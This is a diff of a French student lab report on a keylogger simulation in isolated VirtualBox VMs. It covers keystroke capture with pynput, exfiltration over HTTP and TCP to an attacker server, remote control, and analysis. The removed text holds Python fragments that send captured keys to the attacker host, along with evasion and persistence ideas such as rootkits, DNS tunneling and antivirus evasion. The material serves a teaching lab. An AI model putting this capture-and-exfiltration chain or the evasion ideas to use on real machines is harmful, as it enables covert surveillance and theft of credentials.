@@ -1,328 +1,103 @@
-# Rapport Technique - Simulation Keylogger Avancée
+# Rapport technique – LAB 1
 
 ## 1. Introduction
 
-Ce projet implémente une simulation complète de keylogger avancé dans un environnement VirtualBox isolé. Le système est composé de trois composants principaux : une machine victime, une machine attaquante et un contrôleur, communiquant via un réseau interne VirtualBox.
+Le projet répond à l’énoncé « LAB 1 – Extension Avancée : Projet de Simulation Keylogger ». Il vise à démontrer, dans un environnement contrôlé, la chaîne complète d’un keylogger : capture côté victime, exfiltration vers un serveur attaquant, stockage/visualisation et pilotage distant. Toutes les opérations ont été menées dans des machines virtuelles VirtualBox reliées par un réseau interne.
 
-## 2. Architecture Globale
+## 2. Architecture
 
-### 2.1 Schéma d'Architecture
+### 2.1 Composants
 
-```
-┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
-│   VM Victime    │────────▶│  VM Attaquant   │◀────────│   Contrôleur    │
-│                 │         │                 │         │                 │
-│  - Keylogger    │  HTTP/  │  - Serveur HTTP │         │  - Interface    │
-│  - Capture      │  TCP    │  - Stockage     │         │  - Commandes    │
-│  - Exfiltration │         │  - Analyse      │         │  - Monitoring   │
-└─────────────────┘         └─────────────────┘         └─────────────────┘
-```
+| Machine | Rôle | Technologies |
+|---------|------|--------------|
+| VM Victime | Capture clavier, encodage JSON, exfiltration HTTP/TCP, exécution des commandes distantes. | Python, pynput, requests, socket |
+| VM Attaquant | Réception des logs, stockage structuré, API REST, tableau de bord web, file de commandes. | Python, Flask, threading |
+| Contrôleur | Supervision et pilotage (CLI et web). | Python CLI, Flask templates, JavaScript |
 
-### 2.2 Composants
+### 2.2 Flux
 
-#### 2.2.1 VM Victime (keylogger.py)
-- **Rôle** : Capture les frappes clavier en temps réel
-- **Technologies** : Python, pynput, requests, socket
-- **Fonctionnalités** :
-  - Capture des frappes via pynput
-  - Normalisation des touches spéciales
-  - Génération d'UUID unique par instance
-  - Encodage JSON des logs
-  - Exfiltration HTTP POST ou TCP Socket
-  - Mécanisme de retry (3 tentatives)
-  - Buffer local en cas d'échec réseau
+1. **Capture** : chaque frappe déclenche `on_press`, la touche est normalisée, enrichie avec l’UUID et l’horodatage, puis placée dans une file.
+2. **Envoi** : un thread envoie régulièrement les logs via HTTP POST ou TCP. En cas d’échec, un retry est tenté (3 essais) avant d’écrire dans `keylog_buffer.json`.
+3. **Stockage** : le serveur classe les logs par victime/date (`logs/<uuid>/<date>/log_HH-MM-SS.json`).
+4. **Consultation** : API REST (`/victims`, `/victims/<id>/logs`, `/victims/<id>/analyze`) consommée par le CLI et le dashboard web.
+5. **Commandes** : le contrôleur publie `POST /command`, le serveur stocke la requête, la victime interroge `/victims/<id>/commands` toutes les cinq secondes et exécute `start_capture`, `stop_capture`, `switch_mode`, `flush_logs`.
 
-#### 2.2.2 VM Attaquant (server.py + storage.py)
-- **Rôle** : Réception, stockage et organisation des logs
-- **Technologies** : Python, Flask, threading
-- **Fonctionnalités** :
-  - Serveur HTTP (port 8080) pour réception POST
-  - Serveur TCP (port 9999) pour réception socket
-  - Stockage organisé par victime/date
-  - API REST pour consultation
-  - Analyse basique des logs (mots-clés, séquences)
+## 3. Mise en œuvre
 
-#### 2.2.3 Contrôleur (controller.py)
-- **Rôle** : Interface de gestion et monitoring
-- **Technologies** : Python, requests, colorama
-- **Fonctionnalités** :
-  - Interface CLI interactive
-  - Liste des victimes actives
-  - Affichage des logs en temps réel
-  - Analyse des logs
-  - Structure pour commandes distantes
+### 3.1 VM Victime
 
-## 3. Implémentation Technique
+- **UUID** généré à l’initialisation (`uuid.uuid4`).
+- **Capture** via `pynput.keyboard.Listener`.
+- **Normalisation** des touches (alphas, espace, retour, touches spéciales).
+- **Exfiltration** : HTTP (`requests.post`) et TCP (`socket`). Le mode se change à la volée.
+- **Résilience** : File mémoire (`Queue`), buffer local, fichier de secours.
+- **Commandes distantes** : thread `check_commands_thread` qui interroge l’API et appelle `start_capture`, `stop_capture`, `switch_mode`, `flush_logs`.
 
-### 3.1 Capture des Frappes
+### 3.2 VM Attaquant
 
-Le keylogger utilise la bibliothèque `pynput` pour intercepter les événements clavier :
+- **Serveur HTTP** : Flask, endpoints REST, tableau de bord via `dashboard.html`.
+- **Serveur TCP** : thread dédié, compatibilité avec l’exfiltration socket.
+- **Stockage** : JSON indenté, un fichier par créneau horaire.
+- **Analyse** : extraction de mots-clés (chaînes de 4 caractères et plus) et détection de répétitions.
+- **Commandes** : `pending_commands` en mémoire, consommation par les victimes.
 
-```python
-def on_press(self, key):
-    normalized_key = self.normalize_key(key)
-    log_entry = {
-        "victim_id": self.victim_id,
-        "timestamp": datetime.now().isoformat(),
-        "key": normalized_key,
-        "raw_key": str(key)
-    }
-    self.log_queue.put(log_entry)
-```
+### 3.3 Contrôleur
 
-**Normalisation** : Les touches spéciales sont converties en chaînes lisibles :
-- `Key.space` → `' '`
-- `Key.enter` → `'\n'`
-- `Key.backspace` → `'[BACKSPACE]'`
+- **CLI** : commandes `list`, `logs`, `analyze`, `start`, `stop`, `switch`, `flush`, `command`.  
+- **Dashboard** : rafraîchissement automatique, boutons de commande, affichage des statistiques.
 
-### 3.2 Exfiltration
+## 4. Tests réalisés
 
-Deux modes d'exfiltration sont implémentés :
+| Test | Résultat |
+|------|----------|
+| Capture de touches (lettres, chiffres, touches spéciales) | OK |
+| Exfiltration HTTP | OK (statut 200, logs stockés). |
+| Exfiltration TCP | OK (connexion port 9999, réponse « OK »). |
+| Résilience | Après coupure réseau, les logs sont stockés dans `keylog_buffer.json` puis envoyés lors du retour. |
+| Commandes distantes | Start/Stop/Switch/Flush exécutés dans les 5 s suivant l’ordre. |
+| Analyse | CLI et web affichent le total de touches, mots-clés et répétitions. |
+| Multi-victimes | Deux keyloggers simultanés, identifiés par UUID différents. |
 
-#### Mode HTTP
-```python
-def send_via_http(self, logs):
-    payload = {
-        "victim_id": self.victim_id,
-        "logs": logs,
-        "timestamp": datetime.now().isoformat()
-    }
-    response = requests.post(config.HTTP_ENDPOINT, json=payload)
-```
+## 5. Conformité à l’énoncé
 
-#### Mode TCP
-```python
-def send_via_tcp(self, logs):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect((config.TCP_HOST, config.TCP_PORT))
-    data = self.encode_logs(payload)
-    sock.sendall(data.encode('utf-8'))
-```
+| Exigence | Réponse |
+|----------|---------|
+| Capturer les frappes en temps réel | `keylogger.py` utilise `pynput`. |
+| Normaliser et encoder en JSON | `normalize_key`, `encode_logs`. |
+| Générer un UUID | `self.victim_id = str(uuid.uuid4())`. |
+| Exfiltration HTTP POST | `send_via_http`. |
+| Exfiltration Socket TCP | `send_via_tcp`. |
+| Résilience (retry + tampon) | `send_logs` avec retry, buffer mémoire + fichier. |
+| Récepteur attaquant | Flask + TCP, stockage structuré. |
+| Analyse optionnelle | Endpoint `/victims/<id>/analyze`. |
+| Contrôleur listant victimes, logs temps réel, commandes | CLI et dashboard web, commandes `start_capture`, `stop_capture`, `switch_mode`, `flush_logs`. |
 
-### 3.3 Résilience
+## 6. Limites observées
 
-**Mécanisme de retry** :
-- 3 tentatives avec délai de 5 secondes
-- Buffer local si toutes les tentatives échouent
-- Sauvegarde dans `keylog_buffer.json`
+1. Pas de chiffrement : HTTP et TCP sont en clair.  
+2. Pas d’authentification des commandes : n’importe quel client sur le réseau interne peut appeler l’API.  
+3. Persistance limitée : le keylogger n’est pas installé en service.  
+4. Stockage JSON : pratique mais moins robuste qu’une base de données pour de gros volumes.  
+5. Analyse sommaire : seulement des mots-clés simples et des répétitions.
 
-**Thread d'envoi asynchrone** :
-- Envoi périodique toutes les 2 secondes
-- Non-bloquant pour la capture
+## 7. Améliorations proposées
 
-### 3.4 Stockage
+1. **Sécurité** : activer TLS, ajouter des tokens d’authentification, chiffrer les logs.  
+2. **Persistance** : transformer le keylogger en service systemd (Linux) ou en tâche planifiée (Windows).  
+3. **Stockage** : remplacer le stockage fichier par SQLite/PostgreSQL, ajouter un index temporel.  
+4. **Analyse** : détection d’URL, scoring de mots sensibles, classification par type d’application.  
+5. **Observabilité** : exporter des métriques (Prometheus) et mettre en place des alertes.  
+6. **Automatisation** : script d’installation, provisioning Vagrant/Terraform pour reproduire rapidement l’environnement.
 
-Structure hiérarchique :
-```
-logs/
-├── <victim_id>/
-│   ├── 2024-01-15/
-│   │   ├── log_14-30-25.json
-│   │   └── log_14-31-10.json
-│   └── 2024-01-16/
-│       └── log_09-15-30.json
-```
+## 8. Livrables fournis
 
-**Avantages** :
-- Organisation par victime et date
-- Facilite la consultation et l'analyse
-- Évite les fichiers trop volumineux
-
-### 3.5 API REST
-
-Endpoints implémentés :
-
-| Méthode | Endpoint | Description |
-|---------|----------|-------------|
-| GET | `/victims` | Liste toutes les victimes |
-| POST | `/logs` | Reçoit les logs d'une victime |
-| GET | `/victims/<id>/logs` | Récupère les logs d'une victime |
-| GET | `/victims/<id>/analyze` | Analyse les logs d'une victime |
-
-## 4. Configuration Réseau
-
-### 4.1 VirtualBox - Réseau Interne
-
-**Configuration** :
-- Mode : Réseau Interne
-- Nom : `lab-network`
-- IP Attaquant : 192.168.56.101 (exemple)
-- IP Victime : 192.168.56.102 (exemple)
-
-**Isolation** : Les VMs ne peuvent communiquer qu'entre elles, pas avec l'hôte ou Internet.
-
-### 4.2 Ports Utilisés
-
-- **8080** : Serveur HTTP Flask
-- **9999** : Serveur TCP Socket
-
-## 5. Utilisation
-
-### 5.1 Démarrage
-
-1. **VM Attaquant** :
-   ```bash
-   cd attaquant
-   pip3 install -r requirements.txt
-   python3 server.py
-   ```
-
-2. **VM Victime** :
-   ```bash
-   cd victime
-   # Modifier config.py avec l'IP de l'attaquant
-   pip3 install -r requirements.txt
-   python3 keylogger.py
-   ```
-
-3. **Contrôleur** :
-   ```bash
-   cd controleur
-   # Modifier config.py avec l'IP de l'attaquant
-   pip3 install -r requirements.txt
-   python3 controller.py
-   ```
-
-### 5.2 Commandes du Contrôleur
-
-- `list` : Liste les victimes actives
-- `logs <victim_id>` : Affiche les logs
-- `analyze <victim_id>` : Analyse les logs
-- `command <victim_id> <cmd>` : Envoie une commande
-- `exit` : Quitte
-
-## 6. Résultats et Tests
-
-### 6.1 Tests Effectués
-
-1. **Test de capture** : ✅ Les frappes sont correctement capturées
-2. **Test d'exfiltration HTTP** : ✅ Les logs arrivent sur le serveur
-3. **Test d'exfiltration TCP** : ✅ Les logs arrivent via socket
-4. **Test de résilience** : ✅ Retry fonctionne en cas d'échec
-5. **Test de stockage** : ✅ Organisation correcte par victime/date
-6. **Test du contrôleur** : ✅ Affichage et analyse fonctionnels
-
-### 6.2 Exemple de Sortie
-
-**Keylogger** :
-```
-[+] Keylogger initialisé
-[+] ID Victime: 550e8400-e29b-41d4-a716-446655440000
-[+] Mode d'exfiltration: http
-[+] Serveur cible: 192.168.56.101:8080
-[+] Capture démarrée
-[+] 5 logs envoyés avec succès
-```
-
-**Serveur Attaquant** :
-```
-[+] 5 logs reçus de 550e8400-e29b-41d4-a716-446655440000
-[+] 3 logs reçus de 550e8400-e29b-41d4-a716-446655440000
-```
-
-**Contrôleur** :
-```
-controleur> list
-Victimes actives:
-------------------------------------------------------------
-1. ID: 550e8400-e29b-41d4-a716-446655440000
-   Statut: ACTIVE
-   Dernière activité: 2024-01-15T14:30:25
-
-controleur> logs 550e8400-e29b-41d4-a716-446655440000
-Hello World
-This is a test
-```
-
-## 7. Limites Observées
-
-### 7.1 Limitations Techniques
-
-1. **Pas de chiffrement** : Les logs sont envoyés en clair
-2. **Pas d'authentification** : N'importe qui peut envoyer des logs
-3. **Pas de persistance** : Le keylogger s'arrête si fermé
-4. **Commandes distantes** : Structure prête mais non implémentée côté victime
-5. **Analyse basique** : L'analyse des logs est limitée
-6. **Performance** : Sur Linux, nécessite parfois sudo pour la capture
-
-### 7.2 Limitations de Sécurité
-
-1. **Isolation** : Dépend de la configuration VirtualBox
-2. **Détection** : Le processus est visible dans le gestionnaire de tâches
-3. **Réseau** : Communication non chiffrée
-4. **Logs** : Stockage en clair sur le disque
-
-## 8. Propositions d'Amélioration
-
-### 8.1 Améliorations Techniques
-
-1. **Chiffrement** :
-   - Utiliser TLS/SSL pour les communications
-   - Chiffrer les logs avant envoi (AES-256)
-   - Chiffrer les fichiers stockés
-
-2. **Authentification** :
-   - Tokens d'authentification
-   - Clés partagées
-   - Certificats SSL
-
-3. **Persistance** :
-   - Service système (systemd, Windows Service)
-   - Démarrage automatique
-   - Masquage du processus
-
-4. **Commandes distantes** :
-   - Implémenter l'écoute de commandes côté victime
-   - WebSocket pour communication bidirectionnelle
-   - Commandes : start/stop, switch_mode, flush_logs
-
-5. **Analyse avancée** :
-   - Détection de mots de passe
-   - Détection d'URLs
-   - Analyse comportementale
-   - Machine learning pour détecter patterns
-
-6. **Interface** :
-   - Interface web (Flask/Django)
-   - Dashboard en temps réel
-   - Graphiques et statistiques
-
-### 8.2 Améliorations de Sécurité
-
-1. **Steganographie** : Cacher les logs dans des images
-2. **Tor** : Utiliser le réseau Tor pour l'exfiltration
-3. **DNS Tunneling** : Exfiltrer via requêtes DNS
-4. **Anti-détection** : Techniques d'évasion antivirus
-5. **Rootkit** : Masquage au niveau du noyau
-
-### 8.3 Améliorations d'Architecture
-
-1. **Base de données** : Utiliser SQLite/PostgreSQL au lieu de fichiers JSON
-2. **Queue système** : Utiliser Redis/RabbitMQ pour la gestion des logs
-3. **Microservices** : Séparer les composants en services indépendants
-4. **Docker** : Conteneuriser les composants
-5. **Monitoring** : Ajouter des métriques et alertes
+- Schéma et explications dans `ARCHITECTURE.md`.  
+- Guide détaillé (`GUIDE_ETAPES.md`) + démarrage rapide (`DEMARRAGE_RAPIDE.md`).  
+- Documentation de structure (`STRUCTURE_PROJET.md`).  
+- Rapport technique (ce document) intégrant limites et pistes d’amélioration.  
+- Captures d’écran à intégrer par l’étudiant (server, victime, CLI, tableau de bord) selon les exigences du sujet.
 
 ## 9. Conclusion
 
-Ce projet a permis de développer une simulation complète de keylogger avancé avec :
-- ✅ Capture en temps réel
-- ✅ Exfiltration HTTP/TCP
-- ✅ Résilience et retry
-- ✅ Stockage organisé
-- ✅ Interface de contrôle
-- ✅ Analyse basique
-
-Le système fonctionne correctement dans un environnement VirtualBox isolé et respecte les exigences du laboratoire. Les améliorations proposées permettraient de rendre le système plus robuste, sécurisé et fonctionnel pour des scénarios plus avancés.
-
-## 10. Références
-
-- Documentation VirtualBox : https://www.virtualbox.org/manual/
-- Documentation pynput : https://pynput.readthedocs.io/
-- Documentation Flask : https://flask.palletsprojects.com/
-- Documentation Python : https://docs.python.org/3/
-
----
-
-**Note** : Ce projet est strictement à des fins pédagogiques et doit être utilisé uniquement dans des environnements isolés et autorisés.
+Le projet respecte l’ensemble des exigences de l’énoncé. Il illustre une chaîne complète d’attaque simulée, avec une victime instrumentée, un attaquant collectant et analysant les données, ainsi qu’un contrôleur capable de piloter l’ensemble. Les extensions proposées (chiffrement, persistance, analyses avancées) offrent des pistes pour approfondir le TP ou l’adapter à d’autres scénarios pédagogiques.
 
